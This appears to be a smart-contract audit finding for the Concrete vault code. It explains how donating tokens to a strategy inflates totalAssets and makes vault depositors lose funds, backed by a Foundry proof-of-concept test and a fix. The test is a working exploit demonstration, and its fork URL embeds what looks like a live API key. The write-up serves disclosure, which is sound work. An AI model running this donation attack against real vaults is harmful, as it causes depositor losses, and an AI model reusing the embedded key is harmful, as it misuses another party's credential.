S-69
Strategies include held assets as part of the total assets, causing loss of funds to depositors
0xAlix2
82
Sufficient
383d ago
Finding description and impact

In a standard 4626 vault, totalAssets represents the total deposited assets of a certain token. These assets are taken into consideration when calculating the shares for depositors. The greater the assets, the fewer the minted shares, which makes sense, as the price of a share will increase. All of those assets are withdrawable, i.e. if all users come in and burn all their shares then the vault will end up with 0 assets.

In all the strategies except ProtectStrategy, totalAssets is being calculated as the held assets + the assets deposited into third-party protocols:

function totalAssets() public view override(IERC4626, ERC4626Upgradeable) returns (uint256) {
    // use the balance of this address + allow for custom totalAssets logic inside the strategy
    // This is because some strategies will just have funds inside them, and others will have funds in third parties.
    // The strategies with funds in third parties will need to show the actual balance, taking that into account
    return IERC20(asset()).balanceOf(address(this)) + _totalAssets();
}

On the other hand, whenever a deposit is made into the strategy, a corresponding "protocol deposit" is made, https://github.com/code-423n4/2024-11-concrete/blob/main/src/strategies/StrategyBase.sol#L138:

function _deposit(
    address caller_,
    address receiver_,
    uint256 assets_,
    uint256 shares_
) internal virtual override(ERC4626Upgradeable) whenNotPaused onlyVault {
    // ...

    _protocolDeposit(assets_, shares_);

    // ...
}

Similarly on withdrawal, https://github.com/code-423n4/2024-11-concrete/blob/main/src/strategies/StrategyBase.sol#L165:

function _withdraw(
    address caller_,
    address receiver_,
    address owner_,
    uint256 assets_,
    uint256 shares_
) internal virtual override(ERC4626Upgradeable) whenNotPaused onlyVault {
    // ...

    _protocolWithdraw(assets_, shares_);

    // ...
}

As a result of the above, only assets deposited into third-party protocols are withdrawable. Why? If the strategy tried to withdraw more funds, the third-party call would revert to something like insufficient balance.

So any user could come in and donate some funds to any strategy, which will cause the totalAssets to skyrocket. Remember, the donated amount isn't withdrawable. This will result in a wrong/lowered amount of shares being minted to the vault (which is the only authorized entity to deposit into strategies), and when users come in to withdraw, assets would have gained some profit, but the result would still be less than what's deposited.

This causes a loss of funds to all users depositing into vaults.

Another impact of this is that it can DOS the strategy removal, because of this check https://github.com/code-423n4/2024-11-concrete/blob/main/src/libraries/MultiStrategyVaultHelper.sol#L275.

Proof of Concept

The below represents 2 scenarios with and without donation and shows each result, using the Aave strategy.

contract PoC is Test {
    using Math for uint256;

    Strategy[] strategies;
    GraduatedFee[] graduatedFees;
    ConcreteMultiStrategyVault vault;
    WithdrawalQueue queue;

    IERC20 USDC = IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    address feeRecipient = address(0x1111);
    address admin = address(0x4444);
    address hazel = address(0x2222);

    IERC20 asset;

    // Aave //

    AaveV3Strategy aaveStrategy;
    address aaveDataProvider = 0x69FA688f1Dc47d4B5d8029D5a35FB7a548310654;
    ILendingPool lendingPool;
    IAaveIncentives aaveIncentives;
    IAToken aToken;

    function setUp() public {
        vm.selectFork(
            vm.createFork(
                "https://arb-mainnet.g.alchemy.com/v2/THuQ6WJZ6orCusOEvVFb9baHWzk_KG_D",
                223_500_507
            )
        );

        asset = USDC;

        _setUpGraduatedFees();

        vault = ConcreteMultiStrategyVault(
            Clones.clone(address(new ConcreteMultiStrategyVault()))
        );
        vault.initialize(
            IERC20(address(asset)),
            "USDC Vault",
            "USDCV",
            strategies,
            feeRecipient,
            VaultFees({
                depositFee: 0,
                withdrawalFee: 0,
                protocolFee: 3_00,
                performanceFee: graduatedFees
            }),
            type(uint256).max,
            admin
        );

        queue = new WithdrawalQueue(address(vault));

        vm.startPrank(admin);

        vault.setWithdrawalQueue(address(queue));

        aaveStrategy = _setUpAaveStrategy();
        vault.addStrategy(
            0,
            false,
            Strategy({
                strategy: aaveStrategy,
                allocation: Allocation({index: 0, amount: 100_00})
            })
        );
        vm.stopPrank();
    }

    function _setUpGraduatedFees() internal {
        graduatedFees.push(
            GraduatedFee({lowerBound: 0, upperBound: 500, fee: 300})
        );
        graduatedFees.push(
            GraduatedFee({lowerBound: 501, upperBound: 2000, fee: 1000})
        );
        graduatedFees.push(
            GraduatedFee({lowerBound: 2001, upperBound: 5000, fee: 2000})
        );
        graduatedFees.push(
            GraduatedFee({lowerBound: 5001, upperBound: 10000, fee: 5000})
        );
    }

    function _setUpAaveStrategy() internal returns (AaveV3Strategy strategy) {
        (address _aToken, , ) = IProtocolDataProvider(aaveDataProvider)
            .getReserveTokensAddresses(address(asset));
        aToken = IAToken(_aToken);
        lendingPool = ILendingPool(aToken.POOL());
        aaveIncentives = IAaveIncentives(aToken.getIncentivesController());

        strategy = new AaveV3Strategy(
            asset,
            feeRecipient,
            admin,
            10_00,
            aaveDataProvider,
            address(vault)
        );
    }

    function test_PoCWithoutDonation() public {
        uint256 amount = 100e6;

        _mintAsset(amount, hazel);

        // Hazel initially has 100 USDC
        assertEq(asset.balanceOf(hazel), amount);

        vm.startPrank(hazel);
        // Hazel deposits 100 USDC into the vault
        USDC.approve(address(vault), amount);
        vault.deposit(amount);

        // Vault has 100 shares of AaveStrategy
        assertEq(aaveStrategy.balanceOf(address(vault)), amount);
        // Vault total assets are 100 USDC
        assertEq(vault.totalAssets(), amount);

        vm.warp(block.timestamp + 100 days);

        // Vault total assets are increased over 100 USDC
        assertGt(vault.totalAssets(), amount);

        // Hazel redeems all of her shares
        vault.redeem(vault.balanceOf(hazel));

        // Hazel gains some USDC
        assertEq(asset.balanceOf(hazel), 101_955_364);

        vm.stopPrank();
    }

    function test_PoCWithDonation() public {
        uint256 amount = 100e6;

        _mintAsset(amount, hazel);
        _mintAsset(50e6, address(aaveStrategy));

        // Hazel initially has 100 USDC
        assertEq(asset.balanceOf(hazel), amount);

        vm.startPrank(hazel);
        // Hazel deposits 100 USDC into the vault
        USDC.approve(address(vault), amount);
        vault.deposit(amount);

        // Vault has 1 wei of shares of AaveStrategy
        assertEq(aaveStrategy.balanceOf(address(vault)), 1);
        // Vault total assets are 75 USDC
        assertEq(vault.totalAssets(), 75e6);

        vm.warp(block.timestamp + 100 days);

        // Vault total assets are increased over 75 USDC
        assertEq(vault.totalAssets(), 75_977_683);

        // Hazel redeems all of her shares
        vault.redeem(vault.balanceOf(hazel));

        // Hazel loses some USDC, around 24 USDC
        assertEq(asset.balanceOf(hazel), 75_977_683);

        vm.stopPrank();
    }

    function _mintAsset(uint256 amount_, address to_) internal {
        deal(address(asset), to_, amount_);
    }
}
Recommended mitigation steps

For all strategies that interact with other protocols on every deposit/withdraw, only return the total assets that are deposited in third-party protocols, i.e. all strategies except ProtectStrategy.

function totalAssets() public view override(IERC4626, ERC4626Upgradeable) returns (uint256) {
    // use the balance of this address + allow for custom totalAssets logic inside the strategy
    // This is because some strategies will just have funds inside them, and others will have funds in third parties.
    // The strategies with funds in third parties will need to show the actual balance, taking that into account
-   return IERC20(asset()).balanceOf(address(this)) + _totalAssets();
+   return _totalAssets();
}
